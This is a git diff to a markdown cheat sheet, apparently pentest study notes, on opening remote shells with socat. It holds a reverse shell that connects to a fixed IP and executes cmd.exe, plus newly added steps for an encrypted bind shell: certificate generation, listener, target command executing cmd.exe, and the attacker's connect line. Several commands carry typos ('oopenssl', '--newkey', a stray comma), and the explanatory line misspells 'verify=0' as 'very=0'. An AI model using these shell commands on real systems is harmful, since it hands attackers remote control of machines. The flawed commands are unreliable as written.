@@ -61,11 +61,29 @@ socat -d TCP4-LISTEN:23, fork STDOUT
 socat.exe TCP4:192.168.1.22:23 EXEC:'cmd.exe', pipes
 
 ```
-
-## 6. Use Encryption
-
+## Encrypted Shells
+1. Generate a certificate
 ```sh
-socat OPENSSL-LISTEN:443,cert-bind_shell.pem,verify=0,fork EXEC:/bin/bash
+oopenssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+```
+Create `.pem` file:
+```sh
+cat shell.key shell.crt > shell.pem
+```
+
+Listener:
+`very=0` - don't validate if cert has been signed
+```sh
+socat OPENSSL-LISTEN:4200,cert=shell.pem,verify=0 -
+```
+
+Bind Shell Target
+```sh
+socat OPENSSL-LISTEN:4200,cert=shell.pem,verify=0, EXEC:cmd.exe,pipes
+```
+Bind Shell Attacker
+```sh
+socat OPENSSL:<target ip>:<target-port>,verify=0 -
 ```
 
 
